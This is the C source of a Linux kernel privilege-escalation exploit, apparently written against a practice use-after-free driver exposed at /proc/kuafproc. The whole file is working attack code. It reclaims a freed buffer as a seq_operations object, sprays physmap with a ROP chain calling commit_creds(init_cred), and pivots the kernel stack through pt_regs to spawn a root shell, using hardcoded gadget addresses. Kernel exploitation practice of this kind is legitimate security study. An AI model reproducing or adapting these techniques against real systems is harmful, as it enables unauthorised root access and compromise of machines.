//gcc -masm=intel -static exploit.c -o exploit
//home/heap/uaf/seq_ops/pt_regs/ret2dir/exploit

#define _GNU_SOURCE
#include "mykernelpwn.h"

#define pop_rdi_ret 0xffffffff8107fc70
#define pop_rsp_ret 0xffffffff811cd494
#define ret 0xffffffff8107fc71

#define init_cred 0xffffffff8265a980
#define commit_creds 0xffffffff810b7fb0
#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00974

size_t* physmap_spray_arr[16000];
size_t  page_size;
size_t  try_hit = 0xffff880002505000;

struct kuaf_note {
    size_t idx;
    size_t size;
    char* buf;
};

struct note_data {
    size_t size;
    char* data;
};

int kuaf_fd;

void kuaf_add(size_t idx, size_t size, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x112233, &note);
}


void kuaf_edit(size_t idx, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x223344, &note);
}

//kfree(&notebook[idx]->data)
void kuaf_del(size_t idx)
{
    struct kuaf_note note = {
        .idx = idx,
    };
    ioctl(kuaf_fd, 0x334455, &note);
}

void kuaf_gift(void* buf)
{
    struct kuaf_note note = {
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x445566, &note);
}

//把 notebook[idx]->data 数据读到 buf
ssize_t kuaf_read(int idx, void* buf)
{
    return read(kuaf_fd, buf, idx);
}

size_t SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
size_t INIT_CRED;
size_t POP_RDI_RET;
size_t POP_RSP_RET;
size_t COMMIT_CREDS;
size_t RET;
size_t ADD_RSP_0x198_POP_RBX_POP_RBP_RET;
long   seq_fd;

void construct_rop_chain(size_t* rop)
{
    int idx = 0;
    for(; idx < 2; idx++){
        rop[idx] = RET;
    }
    rop[idx++] = POP_RDI_RET;
    rop[idx++] = INIT_CRED;
    rop[idx++] = COMMIT_CREDS;
    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
    rop[idx++] = 0;
    rop[idx++] = 0;
    rop[idx++] = (size_t)get_root_shell;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_sp + 8;
    rop[idx++] = user_ss;
}

int main(int argc, char** argv, char** envp)
{
    struct note_data kernel_notebook[0x10];
    size_t buf[0x100], index;

    save_status();
    bind_core(0);

    // 打开 proc
    kuaf_fd = open("/proc/kuafproc", O_RDWR);
    if (kuaf_fd < 0) {
        err_exit("Failed to open /proc/kuafproc!");
    }

    // 获得一个 seq_operations object
    note_info("Allocating seq_operations-size object...");
    for(int i = 0; i < 0x10; i++){
        kuaf_add(i, 0x20, buf);
    }
    for(int i = 0; i < 0x10; i++){
        kuaf_del(i);
    }

    // 定位 seq_operations
    seq_fd = open("/proc/self/stat", O_RDONLY);
    for(int i = 0; i < 0x10; i++){
        kuaf_read(i, buf);
        if(buf[0] > 0xffffffff00000000){
            index = i;
            break;
        }
    }
    printf("\033[32m\033[1m[+] Index: %ld\033[0m\n", index);
    
    print_binary(buf, 0x20);

    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE = swapgs_restore_regs_and_return_to_usermode;
    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE += 22;
    INIT_CRED = init_cred;
    POP_RDI_RET = pop_rdi_ret;
    POP_RSP_RET = pop_rsp_ret;
    COMMIT_CREDS = commit_creds;
    RET = ret;
    // add rsp, 0x198 ; pop rbx ; pop rbp ; ret
    ADD_RSP_0x198_POP_RBX_POP_RBP_RET = 0xffffffff816bda54;
    printf("\033[32m\033[1m[+] ADD_RSP_0x198_POP_RBX_POP_RBP_RET: %p\033[0m\n", ADD_RSP_0x198_POP_RBX_POP_RBP_RET);

    page_size = sysconf(_SC_PAGESIZE);
    // construct per-page rop chain
    // mmap 函数 fd 参数为 -1 表示以匿名的方式分配空间。
    physmap_spray_arr[0] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    construct_rop_chain(physmap_spray_arr[0]);

    // spray physmap, so that we can easily hit one of them
    note_info("Spraying physmap...");
    for (int i = 1; i < 15000; i++)
    {
        physmap_spray_arr[i] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (!physmap_spray_arr[i])
            err_exit("Oom for physmap spray!");
        memcpy(physmap_spray_arr[i], physmap_spray_arr[0], page_size);
    }
    note_info("Trigger physmap one_gadget...");

    buf[0] = ADD_RSP_0x198_POP_RBX_POP_RBP_RET;
    kuaf_edit(index, buf);
    __asm__(
       "mov r15,   POP_RSP_RET;"
       "mov r14,   try_hit;"
       "mov r13,   0x3333333333;"
       "mov r12,   0x2222222222;"
       "mov rbp,   0xbbbbbbbbbb;"
       "mov rbx,   0x7777777777;"
       "mov r11,   0x1111111111;"
       "mov r10,   0x1010101010;"
       "mov r9,    0x9999999999;"
       "mov r8,    0x8888888888;"
       "xor rax,   rax;"
       "mov rcx,   0xcccccccccc;"
       
       "mov rdx,   8;"
       "mov rsi,   rsp;"
       "mov rdi,   seq_fd;"             // 通过 seq_operations->stat 来触发
       "syscall"
    );

    return 0;
}